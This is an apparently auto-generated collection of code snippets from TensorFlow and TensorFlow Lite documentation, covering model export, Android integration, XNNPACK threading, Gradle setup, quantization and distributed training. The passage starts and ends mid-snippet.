 private fun setupBertQuestionAnswerer() {
 val baseOptionsBuilder = BaseOptions.builder().setNumThreads(numThreads)
 ...
 val options = BertQuestionAnswererOptions.builder()
 .setBaseOptions(baseOptionsBuilder.build())
 .build()

 try {
 bertQuestionAnswerer =
 BertQuestionAnswerer.createFromFileAndOptions(context, BERT_QA_MODEL, options)
 } catch (e: IllegalStateException) {
 answererListener
 ?.onError("Bert Question Answerer failed to initialize. See error logs for details")
 Log.e(TAG, "TFLite failed to load model with error: " + e.message)
 }
 }
 ...
 }
```

----------------------------------------

TITLE: Printing Model Summary (Python)
DESCRIPTION: Prints a summary of the model architecture to the console. This includes details such as layer names, output shapes, and the total number of parameters in the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_8

LANGUAGE: python
CODE:
```
summary()
```

----------------------------------------

TITLE: Setting Thread Count for XNNPACK via InterpreterBuilder (C++)
DESCRIPTION: When building TensorFlow Lite with XNNPACK via Bazel flags, use this C++ snippet to specify the number of threads for the XNNPACK engine by passing the value to the `tflite::InterpreterBuilder` constructor. Note that `Interpreter::SetNumThreads` does not control XNNPACK threads in this configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_4

LANGUAGE: C++
CODE:
```
// Load model
tflite::Model* model;
...

// Construct the interprepter
tflite::ops::builtin::BuiltinOpResolver resolver;
std::unique_ptr<tflite::Interpreter> interpreter;

TfLiteStatus res = tflite::InterpreterBuilder(model, resolver, num_threads);
```

----------------------------------------

TITLE: Embed Image using TensorFlow Lite Embedder Python
DESCRIPTION: Extracts feature vectors from a provided tensor image, optionally restricting the operation to a specified bounding box. Takes a `TensorImage` and an optional `BoundingBox`. Returns an `EmbeddingResult` containing the extracted embeddings or raises ValueError/RuntimeError on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedder.md#_snippet_3

LANGUAGE: python
CODE:
```
embed(
    image: tflite_support.task.vision.TensorImage,
    bounding_box: Optional[tflite_support.task.processor.BoundingBox] = None
) -> tflite_support.task.processor.EmbeddingResult
```

----------------------------------------

TITLE: Loading Random Audio Sample for Inference Python
DESCRIPTION: Retrieves or loads a random audio file from the test dataset to use for individual inference testing. It uses helper functions `get_random_audio_file` (to load) and `show_bird_data` (to display info about the audio). Requires these helper functions to be defined elsewhere.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
# if you want to try another file just uncoment the line below
random_audio = get_random_audio_file()
show_bird_data(random_audio)
```

----------------------------------------

TITLE: Exporting TFLite Model using Model Maker Python
DESCRIPTION: Exports the trained model into the TensorFlow Lite format (`.tflite`), suitable for deployment on mobile and embedded devices. It calls the model's `export` method, specifying the output directory and filename. Requires a trained `model` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
models_path = './birds_models'
print(f'Exporing the TFLite model to {models_path}')

model.export(models_path, tflite_filename='my_birds_model.tflite')
```

----------------------------------------

TITLE: Exporting Trained Text Classification Model to TFLite in Python
DESCRIPTION: Exports the trained text classification model to the TensorFlow Lite format, saving the output files into the specified directory ('average_word_vec'). By default, this exports a float TFLite model for the average word embedding architecture.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
model.export(export_dir='average_word_vec')
```

----------------------------------------

TITLE: Handling Text Classification Results in Kotlin Listener
DESCRIPTION: This snippet defines the `onResult` method of a `TextClassificationHelper.TextResultsListener`. It receives a list of `Category` objects representing the prediction scores and the inference time. The method updates UI elements (inference time display, results list adapter) on the main thread by sorting the results by score and notifying the adapter of changes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_10

LANGUAGE: kotlin
CODE:
```
private val listener = object : TextClassificationHelper.TextResultsListener {
  override fun onResult(results: List<Category>, inferenceTime: Long) {
    runOnUiThread {
      activityMainBinding.bottomSheetLayout.inferenceTimeVal.text =
        String.format("%d ms", inferenceTime)

      adapter.resultsList = results.sortedByDescending {
        it.score
      }

      adapter.notifyDataSetChanged()
    }
  }
  ...
}
```

----------------------------------------

TITLE: Defining C++ Task API Interface and Delegation
DESCRIPTION: This C++ snippet illustrates how a custom Task API class, such as `BertQuestionAnswerer`, inherits from `BaseTaskApi` and specifies its input and output types using template parameters. It demonstrates defining a model-specific method, like `Answer`, which serves as the public interface and internally delegates the actual inference call to the base class method `BaseTaskApi::Infer`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_1

LANGUAGE: C++
CODE:
```
class BertQuestionAnswerer : public BaseTaskApi<
                                  std::vector<QaAnswer>, // OutputType
                                  const std::string&, const std::string& // InputTypes
                                  > {
      // Model specific function delegating calls to BaseTaskApi::Infer
      std::vector<QaAnswer> Answer(const std::string& context, const std::string& question) {
        return Infer(context, question).value();
      }
    }
```

----------------------------------------

TITLE: Building TFLite with XNNPACK via Bazel Flag
DESCRIPTION: This Bazel build command demonstrates how to build TensorFlow Lite with the XNNPACK delegate enabled by default, which is recommended for desktop environments. The key flag is `--define tflite_with_xnnpack=true`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_3

LANGUAGE: Bazel
CODE:
```
bazel build -c opt --fat_apk_cpu=x86,x86_64,arm64-v8a,armeabi-v7a \
  --host_crosstool_top=@bazel_tools//tools/cpp:toolchain \
  --define android_dexmerger_tool=d8_dexmerger \
  --define android_incremental_dexing_tool=d8_dexbuilder \
  --define tflite_with_xnnpack=true \
  //tensorflow/lite/java:tensorflow-lite
```

----------------------------------------

TITLE: Create Audio Classification Model (Python)
DESCRIPTION: Initializes the underlying model architecture for the audio classifier. Requires the number of output classes and a flag indicating whether the whole model (including the base) should be trained.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_3

LANGUAGE: Python
CODE:
```
create_model(
    num_classes, train_whole_model
)
```

----------------------------------------

TITLE: Running Classifier Training in AverageWordVecSpec
DESCRIPTION: Initiates the training process for the text classification model. It requires training and validation datasets, epochs, steps per epoch, and the number of classes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_9

LANGUAGE: python
CODE:
```
run_classifier(
    train_ds, validation_ds, epochs, steps_per_epoch, num_classes, **kwargs
)
```

----------------------------------------

TITLE: Evaluating TFLite Model - Python
DESCRIPTION: Evaluates the exported TensorFlow Lite model using the provided validation data. This step helps assess the performance of the TFLite model after conversion, ensuring it meets accuracy requirements for deployment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
model.evaluate_tflite('model.tflite', validation_data)
```

----------------------------------------

TITLE: Loading Test Data with Custom Spec - TensorFlow Lite Model Maker - Python
DESCRIPTION: Loads data from a CSV file for evaluation using the `DataLoader` utility, specifying the text and label columns, providing the customized model specification, and indicating that it is not for training (`is_training=False`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_27

LANGUAGE: python
CODE:
```
new_test_data = DataLoader.from_csv(
      filename='dev.csv',
      text_column='sentence',
      label_column='label',
      model_spec=new_model_spec,
      is_training=False)
```

----------------------------------------

TITLE: Vectorizing Text to Integers - Python
DESCRIPTION: This code creates two lookup tables: one mapping unique characters to integer indices and another mapping indices back to characters. It then converts the entire text into a sequence of integer IDs using the character-to-index mapping.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
# Creating a mapping from unique characters to indices
char2idx = {u:i for i, u in enumerate(vocab)}
idx2char = np.array(vocab)

text_as_int = np.array([char2idx[c] for c in text])
```

----------------------------------------

TITLE: Getting Output Tensor Value in TFLite Python
DESCRIPTION: Retrieves a copy of the value of an output tensor from the TFLite interpreter. This function is used to get computed results after invoking the model but makes a copy of the data. Use `tensor()` to avoid copying.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_11

LANGUAGE: python
CODE:
```
get_tensor(
    tensor_index, subgraph_index=0
)
```

----------------------------------------

TITLE: Implementing TFLite DelegateProvider (C++)
DESCRIPTION: This C++ class `DummyDelegateProvider` implements the `DelegateProvider` interface, allowing the custom dummy delegate to be registered with TFLite tools. It includes methods for creating flags, logging parameters, and instantiating the delegate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_3

LANGUAGE: C++
CODE:
```
class DummyDelegateProvider : public DelegateProvider {
 public:
  DummyDelegateProvider() {
    default_params_.AddParam("use_dummy_delegate",
                             ToolParam::Create<bool>(false));
  }

  std::vector<Flag> CreateFlags(ToolParams* params) const final;

  void LogParams(const ToolParams& params) const final;

  TfLiteDelegatePtr CreateTfLiteDelegate(const ToolParams& params) const final;

  std::string GetName() const final { return "DummyDelegate"; }
};
REGISTER_DELEGATE_PROVIDER(DummyDelegateProvider);

std::vector<Flag> DummyDelegateProvider::CreateFlags(ToolParams* params) const {
  std::vector<Flag> flags = {CreateFlag<bool>("use_dummy_delegate", params,
                                              "use the dummy delegate.")};
  return flags;
}

void DummyDelegateProvider::LogParams(const ToolParams& params) const {
  TFLITE_LOG(INFO) << "Use dummy test delegate : ["
                   << params.Get<bool>("use_dummy_delegate") << "]";
}

TfLiteDelegatePtr DummyDelegateProvider::CreateTfLiteDelegate(
    const ToolParams& params) const {
  if (params.Get<bool>("use_dummy_delegate")) {
    auto default_options = TfLiteDummyDelegateOptionsDefault();
    return TfLiteDummyDelegateCreateUnique(&default_options);
  }
  return TfLiteDelegatePtr(nullptr, [](TfLiteDelegate*) {});
}

```

----------------------------------------

TITLE: Initialize TFLite Vision Task Library - Kotlin
DESCRIPTION: This Kotlin snippet demonstrates how to initialize the TensorFlow Lite Vision component from Google Play services. Initialization is a prerequisite before using any TFLite Vision APIs. It requires a context object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_1

LANGUAGE: Kotlin
CODE:
```
init {
  TfLiteVision.initialize(context)
}
```

----------------------------------------

TITLE: Stopping Audio Recording and Classification on Pause (Kotlin)
DESCRIPTION: Implements the Android lifecycle method onPause() to gracefully stop the audio recording and classification process when the application component (Activity or Fragment) loses user focus. It checks if the helper object is initialized and calls its stopAudioClassification method to release resources and prevent continuous background processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_11

LANGUAGE: kotlin
CODE:
```
override fun onPause() {
  super.onPause()
  if (::audioHelper.isInitialized ) {
    audioHelper.stopAudioClassification()
  }
}
```

----------------------------------------

TITLE: Initializing AudioClassifierOptions in Python
DESCRIPTION: Initializes the `AudioClassifierOptions` class. It requires `base_options` for task configuration and optionally accepts `classification_options` to configure classification-specific settings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifierOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.audio.AudioClassifierOptions(
    base_options: tflite_support.task.core.BaseOptions,
    classification_options: tflite_support.task.processor.ClassificationOptions = dataclasses.field(default_factory=_ClassificationOptions)
)
```

----------------------------------------

TITLE: Using XNNPACK Weights Cache with Delegate API (C++)
DESCRIPTION: This C++ snippet shows how to use the XNNPACK weights cache to share packed weights between multiple TFLite interpreter instances based on the same model when using the low-level delegate API. It involves creating a cache, passing it via delegate options, finalizing the cache (hard or soft), and deleting it after all delegates and interpreters are released.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_6

LANGUAGE: C++
CODE:
```
// Create 2 interpreters which share the same model.
std::unique_ptr<tflite::Interpreter> interpreter1;
std::unique_ptr<tflite::Interpreter> interpreter2;

// Create a weights cache that you can pass to XNNPACK delegate.
TfLiteXNNPackDelegateWeightsCache* weights_cache =
    TfLiteXNNPackDelegateWeightsCacheCreate();

// Like using the low-level API above, initialize options, and pass this cache
// to XNNPACK delegate via the options.
TfLiteXNNPackDelegateOptions xnnpack_options =
    TfLiteXNNPackDelegateOptionsDefault();
xnnpack_options.weights_cache = weights_cache;

// Modify graph with delegate, as above...
TfLiteDelegate* delegate1 = TfLiteXNNPackDelegateCreate(&xnnpack_options);
if (interpreter1->ModifyGraphWithDelegate(delegate1) != kTfLiteOk) {
    // Static weights will be packed and written into weights_cache.
}
TfLiteDelegate* delegate2 = TfLiteXNNPackDelegateCreate(&xnnpack_options);
if (interpreter1->ModifyGraphWithDelegate(delegate2) != kTfLiteOk) {
    // XNNPACK will reuse packed weights if they can be found in the weights
    // cache.
}

// Finalize the weights cache.
// Hard finalization has the lowest memory overhead, but requires that all
// TFLite interpreter instances must be created up front before any finalization
// and inference.
TfLiteXNNPackDelegateWeightsCacheFinalizeHard(weights_cache);

// Alternatively, soft-finalizate the weights cache. This is useful if more
// delegates using the same model will to be created after finalization.
// TfLiteXNNPackDelegateWeightsCacheFinalizeSoft(weights_cache);

// Later, after all the interpreters and XNNPACK delegates using the cache are
// destroyed, release the weights cache.
TfLiteXNNPackDelegateWeightsCacheDelete(weights_cache);
```

----------------------------------------

TITLE: Initializing and Running Object Detection Objective-C
DESCRIPTION: Illustrates how to initialize the `TFLObjectDetector` using a model file path from the main bundle and execute inference on a `GMLImage` object created from a `UIImage` in Objective-C.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_4

LANGUAGE: objectivec
CODE:
```
// Imports
#import <TensorFlowLiteTaskVision/TensorFlowLiteTaskVision.h>

// Initialization
NSString *modelPath = [[NSBundle mainBundle] pathForResource:@"ssd_mobilenet_v1" ofType:@"tflite"];

TFLObjectDetectorOptions *options = [[TFLObjectDetectorOptions alloc] initWithModelPath:modelPath];

// Configure any additional options:
// options.classificationOptions.maxResults = 3;

TFLObjectDetector *detector = [TFLObjectDetector objectDetectorWithOptions:options
                                                                     error:nil];

// Convert the input image to MLImage.
UIImage *image = [UIImage imageNamed:@"dogs.jpg"];

// There are other sources for GMLImage. For more details, please see:
// https://developers.google.com/ml-kit/reference/ios/mlimage/api/reference/Classes/GMLImage
GMLImage *gmlImage = [[GMLImage alloc] initWithImage:image];

// Run inference
TFLDetectionResult *detectionResult = [detector detectWithGMLImage:gmlImage error:nil];
```

----------------------------------------

TITLE: Variable Initialization Before Control Flow - Recommended Practice
DESCRIPTION: To avoid limitations with undefined or conditionally defined variables, it is recommended to define variables with a default value before entering a conditional or loop statement that operates on `tf.Tensor` conditions. This ensures the variable is always initialized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_8

LANGUAGE: python
CODE:
```
x = tf.constant(0)
if tf.random.uniform(()) > 0.5:
  x = tf.constant(1)
tf.print(x)  # Okay -- x is either 0 or 1
```

----------------------------------------

TITLE: Add TFLite Play Services Dependency Gradle
DESCRIPTION: Adds the Google Play services TensorFlow Lite Java library dependency to the Android application's module-level build.gradle file, enabling access to the TFLite Play Services API for runtime initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
implementation "com.google.android.gms:play-services-tflite-java:16.2.0-beta02"
```

----------------------------------------

TITLE: Configure Gradle Dependencies and Options Java
DESCRIPTION: Configures the Android module's build.gradle file. It prevents compression for .tflite files in the APK and adds the necessary TensorFlow Lite Task Vision library and GPU delegate plugin dependencies for Java projects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_searcher.md#_snippet_0

LANGUAGE: Java
CODE:
```
android {
    // Other settings

    // Specify tflite index file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }

}

dependencies {
    // Other dependencies

    // Import the Task Vision Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-vision:0.4.4'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin:0.4.4'
}
```

----------------------------------------

TITLE: Configure Gradle for TFLite TextSearcher (Android)
DESCRIPTION: Configures the Android module's `build.gradle` file to prevent compression of `.tflite` files within the APK and adds the necessary TensorFlow Lite Task Library and GPU delegate dependencies for Android projects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_searcher.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
android {
    // Other settings

    // Specify tflite index file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }

}

dependencies {
    // Other dependencies

    // Import the Task Vision Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-vision:0.4.4'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin:0.4.4'
}
```

----------------------------------------

TITLE: Analyzing Simple Keras TFLite Model using Analyzer API (Python)
DESCRIPTION: This snippet demonstrates the basic usage of the TensorFlow Lite Analyzer API. It shows how to define a simple Keras Sequential model, convert it to the TFLite format, and then use `tf.lite.experimental.Analyzer.analyze` with the `model_content` parameter to print the model's internal structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/model_analyzer.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

model = tf.keras.models.Sequential([
  tf.keras.layers.Flatten(input_shape=(128, 128)),
  tf.keras.layers.Dense(256, activation='relu'),
  tf.keras.layers.Dropout(0.2),
  tf.keras.layers.Dense(10)
])

fb_model = tf.lite.TFLiteConverter.from_keras_model(model).convert()

tf.lite.experimental.Analyzer.analyze(model_content=fb_model)
```

----------------------------------------

TITLE: Installing Dependencies Python
DESCRIPTION: Installs necessary system libraries (`libportaudio2` for audio playback) and the `tflite-model-maker` Python package required for retraining the audio classification model. These commands are executed within the environment using the `!` prefix, common in notebooks like Colab.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
!sudo apt -y install libportaudio2
!pip install tflite-model-maker
```

----------------------------------------

TITLE: Plotting Sample Images Python
DESCRIPTION: Generates and displays a grid of 25 sample images from the loaded dataset along with their corresponding class labels. It uses matplotlib to visualize the images.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
plt.figure(figsize=(10,10))
for i, (image, label) in enumerate(data.gen_dataset().unbatch().take(25)):
  plt.subplot(5,5,i+1)
  plt.xticks([])
  plt.yticks([])
  plt.grid(False)
  plt.imshow(image.numpy(), cmap=plt.cm.gray)
  plt.xlabel(data.index_to_label[label.numpy()])
plt.show()
```

----------------------------------------

TITLE: Answering Question - BertQuestionAnswerer Python
DESCRIPTION: This method performs question answering based on the provided context and question strings. It returns a `QuestionAnswererResult` object, which may be empty if no answer is found. It can raise `ValueError` or `RuntimeError`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertQuestionAnswerer.md#_snippet_1

LANGUAGE: python
CODE:
```
answer(
    context: str, question: str
) -> tflite_support.task.processor.QuestionAnswererResult
```

----------------------------------------

TITLE: Build Selective TensorFlow Lite Framework (Shell)
DESCRIPTION: Builds a smaller, optimized TensorFlow Lite static framework containing only the ops required by a specified set of models. It uses a bash script, taking input model paths and target architectures as parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_4

LANGUAGE: Shell
CODE:
```
bash tensorflow/lite/ios/build_frameworks.sh \
  --input_models=model1.tflite,model2.tflite \
  --target_archs=x86_64,armv7,arm64
```

----------------------------------------

TITLE: Create Interpreter with Play Services Runtime (Async) - Java
DESCRIPTION: This Java snippet demonstrates how to create a TensorFlow Lite Interpreter instance after TFLite initialization completes successfully. It sets the runtime option to use the Google Play services version and handles potential creation failures, avoiding the main thread.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_8

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.InterpreterApi
import org.tensorflow.lite.InterpreterApi.Options.TfLiteRuntime
...
private InterpreterApi interpreter;
...
initializeTask.addOnSuccessListener(a -> {
    interpreter = InterpreterApi.create(modelBuffer,
      new InterpreterApi.Options().setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY));
  })
  .addOnFailureListener(e -> {
    Log.e("Interpreter", String.format("Cannot initialize interpreter: %s",
          e.getMessage()));
  });
```

----------------------------------------

TITLE: Converting Logits to Probabilities with NumPy (Python)
DESCRIPTION: This Python snippet demonstrates how to convert raw logit scores obtained from a TensorFlow Lite model output into a probability distribution over the classes. It applies the exponential function to the logits and then normalizes them by dividing by their sum, effectively performing the softmax calculation using NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/video_classification/overview.md#_snippet_0

LANGUAGE: Python
CODE:
```
exp_logits = np.exp(np.squeeze(logits, axis=0))
probabilities = exp_logits / np.sum(exp_logits)
```

----------------------------------------

TITLE: Define MutableOpResolver and BuiltinOpResolver Classes C++
DESCRIPTION: Defines derived classes from the `OpResolver` interface in C++. `MutableOpResolver` allows adding or modifying operator registrations, while `BuiltinOpResolver` provides all standard TensorFlow Lite built-in operator implementations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_16

LANGUAGE: C++
CODE:
```
class MutableOpResolver : public OpResolver {
 public:
  MutableOpResolver();  // Constructs an initially empty op resolver.
  void AddAll(const MutableOpResolver& other);
  ...
};

class BuiltinOpResolver : public MutableOpResolver {
 public:
  BuiltinOpResolver();  // Constructs an op resolver with all the builtin ops.
};
```

----------------------------------------

TITLE: Download MobileNet Model and Labels
DESCRIPTION: Downloads a pre-trained MobileNet v1 model and its corresponding labels file necessary to run the image classification demo. Uses `curl` to fetch compressed archives and `tar` to extract specific files to the /tmp directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_4

LANGUAGE: shell
CODE:
```
# Get model
curl https://storage.googleapis.com/download.tensorflow.org/models/mobilenet_v1_2018_02_22/mobilenet_v1_1.0_224.tgz | tar xzv -C /tmp

# Get labels
curl https://storage.googleapis.com/download.tensorflow.org/models/mobilenet_v1_1.0_224_frozen.tgz  | tar xzv -C /tmp  mobilenet_v1_1.0_224/labels.txt

mv /tmp/mobilenet_v1_1.0_224/labels.txt /tmp/
```

----------------------------------------

TITLE: Create and Train TensorFlow Audio Classifier (Python)
DESCRIPTION: Class method to load data and retrain an audio classification model. It requires training data and a model specification, with optional validation data, batch size, epochs, model directory, training flags, and control over training the base model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
create(
    train_data,
    model_spec,
    validation_data=None,
    batch_size=32,
    epochs=5,
    model_dir=None,
    do_train=True,
    train_whole_model=False
)
```

----------------------------------------

TITLE: Restriction on Changing Loop Condition Type - TensorFlow Python
DESCRIPTION: Shows a `while` loop that causes an error because the type of the condition (`i < 10`) changes from a Python boolean (executing as normal Python) to a `tf.Tensor` (requiring TensorFlow loop conversion) after the first iteration. AutoGraph requires the condition type to be consistent.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_19

LANGUAGE: Python
CODE:
```
i = 0
while i < 10:  # `i < 10` is a Python bool - run as normal while loop
  i = tf.constant(1)  # Error -- `i < 10` would now be a `tf.Tensor`
```

----------------------------------------

TITLE: Creating AudioClassifier from File Python
DESCRIPTION: Creates an AudioClassifier object by loading a TensorFlow Lite model from the specified file path. This is a convenient class method for initializing the classifier directly from a model file without needing to configure detailed options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifier.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'AudioClassifier'
```

----------------------------------------

TITLE: Creating and Training Question Answer Model in Python
DESCRIPTION: Loads data and trains a Question Answer model. It takes training data, a model specification, and optional parameters for batch size, epochs, steps per epoch, shuffling, and whether to perform training. Returns an instance based on QuestionAnswer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create(
    train_data,
    model_spec,
    batch_size=None,
    epochs=2,
    steps_per_epoch=None,
    shuffle=False,
    do_train=True
)
```

----------------------------------------

TITLE: Defining Representative Dataset for Quantization Python
DESCRIPTION: Loads the MNIST training data, preprocesses it, and creates a TensorFlow Dataset. It then defines a generator function `representative_data_gen` that yields a batch of data points from the dataset, used by the converter to calibrate the model for quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
mnist_train, _ = tf.keras.datasets.mnist.load_data()
images = tf.cast(mnist_train[0], tf.float32) / 255.0
mnist_ds = tf.data.Dataset.from_tensor_slices((images)).batch(1)
def representative_data_gen():
  for input_value in mnist_ds.take(100):
    # Model has only one input so each data point has one element.
    yield [input_value]
converter.representative_dataset = representative_data_gen
```

----------------------------------------

TITLE: Setting Up Distributed TensorFlow Training
DESCRIPTION: This snippet defines the core logic for distributed training. It includes a `replica_step` function using `tf.function` for efficient execution, which handles gradient computation, collective reduction across devices, and application of updates. It also defines `init_model` to initialize the model on one device and copy weights to others. The main part demonstrates how to create `ReplicatedFunction` instances for initialization and training steps and runs the distributed training loop over epochs and data batches, splitting data per device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
# This is similar to `train_step` except for an extra collective reduction of
# gradients
@tf.function
def replica_step(model, inputs, labels,
                 learning_rate=None, num_devices=None):
  gradients = compute_gradients(model, inputs, labels)
  # Note that each replica performs a reduction to compute mean of gradients.
  reduced_gradients = collective_mean(gradients, num_devices)
  updates = compute_sgd_updates(reduced_gradients, learning_rate)
  apply_updates(model, updates)

models = [Model() for _ in devices]

# The code below builds all the model objects and copies model parameters from
# the first model to all the replicas.
def init_model(model):
  model(tnp.zeros((1, INPUT_SIZE), dtype=tnp.float32))
  if model != models[0]:
    # Copy the first models weights into the other models.
    for p1, p2 in zip(model.params, models[0].params):
      p1.assign(p2)

with tf.device(devices[0]):
  init_model(models[0])
# Replicate and run the parameter initialization.
ReplicatedFunction(init_model, devices[1:])(models[1:])

# Replicate the training step
replicated_step = ReplicatedFunction(
    replica_step, devices, learning_rate=0.1, num_devices=len(devices))

accuracies = []
print("Running distributed training on devices: %s" % devices)
for _ in range(NUM_EPOCHS):
  for inputs, labels in train_dataset:
    replicated_step(models,
                    tnp.split(inputs, len(devices)),
                    tnp.split(labels, len(devices)))
  accuracies.append(evaluate(models[0], x_test, y_test))

plot_accuracies(accuracies)
```

----------------------------------------

TITLE: Define TensorFlow Lite Model Name - Kotlin
DESCRIPTION: Declares a Kotlin variable `modelName` and assigns it the filename of the TensorFlow Lite model (`.tflite`) stored in the app's `assets` directory. This string is used later to load the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_5

LANGUAGE: Kotlin
CODE:
```
val modelName = "mobilenetv1.tflite"
```

----------------------------------------

TITLE: Configuring CMake for AArch64 TFLite (sh)
DESCRIPTION: This script block sets environment variables for the AArch64 cross-compiler prefix and compilation flags, then invokes CMake to configure the TensorFlow Lite build system for the AArch64 Linux target using the downloaded toolchain.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_3

LANGUAGE: sh
CODE:
```
ARMCC_PREFIX=${HOME}/toolchains/gcc-arm-8.3-2019.03-x86_64-aarch64-linux-gnu/bin/aarch64-linux-gnu-
ARMCC_FLAGS="-funsafe-math-optimizations"
cmake -DCMAKE_C_COMPILER=${ARMCC_PREFIX}gcc \
  -DCMAKE_CXX_COMPILER=${ARMCC_PREFIX}g++ \
  -DCMAKE_C_FLAGS="${ARMCC_FLAGS}" \
  -DCMAKE_CXX_FLAGS="${ARMCC_FLAGS}" \
